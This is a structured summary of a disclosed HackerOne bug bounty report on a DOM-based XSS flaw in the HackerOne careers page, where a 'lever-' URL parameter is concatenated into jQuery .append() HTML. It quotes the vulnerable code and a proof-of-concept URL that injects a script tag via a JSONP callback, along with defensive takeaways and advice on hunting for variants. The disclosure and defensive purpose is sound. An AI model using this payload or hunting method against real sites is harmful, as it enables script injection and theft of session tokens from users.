# DOM-based Cross-Site Scripting (XSS) on HackerOne Careers Page via Lever Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 474656 | https://hackerone.com/reports/474656
- **Submitted:** 2019-01-04
- **Reporter:** nguyenlv7
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** DOM-based XSS, Improper Input Validation, Unsafe DOM Manipulation
- **CVEs:** None
- **Category:** web-api

## Summary
A DOM-based XSS vulnerability was discovered on the HackerOne careers page where user-controlled URL parameters containing 'lever-' prefix are directly appended to URLs and injected into the DOM via jQuery without sanitization. While the vulnerability is partially mitigated by CSP on modern browsers (Firefox, Chrome), it remains exploitable on Internet Explorer and Edge browsers that do not properly enforce CSP.

## Attack scenario
1. Attacker crafts a malicious URL with lever parameter: https://www.hackerone.com/careers?lever-#aaa"><script src="..."></script>
2. Victim visits the malicious URL via phishing or social engineering
3. JavaScript code extracts the lever parameter from window.location.href
4. The extracted parameter is concatenated directly into an anchor tag's href attribute without encoding
5. jQuery appends the unsanitized HTML string to the DOM via .append()
6. On IE/Edge browsers, the injected script executes within the application context, potentially stealing session tokens or credentials

## Root cause
Unsafe DOM manipulation by directly concatenating user-supplied URL parameters into HTML strings passed to jQuery's .append() method without proper output encoding or sanitization. The application trusts the 'lever-' parameter from the URL query string and fails to HTML-encode the value before inserting it into the DOM.

## Attacker mindset
An attacker would recognize that URL parameters are reflected into JavaScript and DOM without encoding. They would test various browsers to find ones with weak or missing CSP enforcement (IE/Edge). The attacker would craft a payload that breaks out of the href attribute context and injects arbitrary script tags or event handlers.

## Defensive takeaways
- Always HTML-encode output when inserting user input into DOM, especially href attributes (use textContent or safer APIs instead of string concatenation)
- Use jQuery's .prop() or .attr() with proper encoding instead of string concatenation with .append()
- Implement strict Content Security Policy (CSP) with script-src 'self' and test across all target browsers
- Use URL parameter validation and whitelisting for expected parameter names and formats
- Leverage modern DOM APIs like createElement() and setAttribute() instead of innerHTML/append with raw strings
- Consider using a templating engine with automatic escaping (e.g., Handlebars, EJS)
- Conduct security code reviews for all user input handling and DOM manipulation
- Regularly test security controls on IE/Edge which often have weaker default protections

## Variant hunting
Look for similar patterns in other JavaScript files on HackerOne and other web applications where: 1) URL parameters are extracted without validation, 2) Parameters are concatenated into HTML strings, 3) The strings are passed to jQuery methods like .append(), .html(), or .prepend(), 4) Special attention to tracking parameters, referral parameters, or any parameter with prefixes like 'utm-', 'ref-', 'track-', 'source-' which often escape proper encoding

## MITRE ATT&CK
- T1190
- T1133
- T1566

## Notes
The reporter noted that modern browsers (Firefox, Chrome) automatically encode URL parameters, preventing exploitation, but older browsers (IE, Edge) do not enforce this protection. This highlights the importance of application-level encoding regardless of browser behavior. The CSP policy on the site successfully blocked script execution on compliant browsers, but the underlying input validation vulnerability remains. The vulnerability affects the recruitment/careers page which could be used to target employees or potential hires through job posting links.

## Full report
<details><summary>Expand</summary>

Dear HackerOne team,
**Summary:**
I found DOM XSS at endpoint `https://www.hackerone.com/careers`, but can not bypass CSP. It's work on IE and Edge.

### Steps To Reproduce
- JS file is "Masonry js file", vulnerability code:

```javascript
//Checking for potential Lever source or origin parameters
var pageUrl = window.location.href;
var leverParameter = '';
var trackingPrefix = '?lever-'

if( pageUrl.indexOf(trackingPrefix) >= 0){
  // Found Lever parameter
  var pageUrlSplit = pageUrl.split(trackingPrefix);
  leverParameter = '?lever-'+pageUrlSplit[1];
}
```
```javascript
 var link = posting.hostedUrl+leverParameter;
    
    	jQuery('#jobs-container .jobs-list').append(
      '<div class="job '+teamCleanString+' '+locationCleanString.replace(',', '')+' '+commitmentCleanString+'">' +
        '<a class="job-title" href="'+link+'"">'+title+'</a>' +
        '<p class="tags"><span>'+team+'</span><span>'+location+'</span><span>'+commitment+'</span></p>' +
        '<p class="description">'+shortDescription+'</p>' +
        '<a class="btn" href="'+link+'">Learn more</a>' +
      '</div>'  
    
      );
```
-  `link` variable is append by jquery.
- POC: `https://www.hackerone.com/careers?lever-#aaa"><script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>`

### Optional: Your Environment (Browser version, Device, etc)

 * IE, Edge (because url is encoded on firefox and chrome)

### Optional: Supporting Material/References (Screenshots)
 {F400895}
{F400896}

## Impact

* XSS but can not bypass CSP
* inject html code

</details>

---
*Analysed by Claude on 2026-05-12*
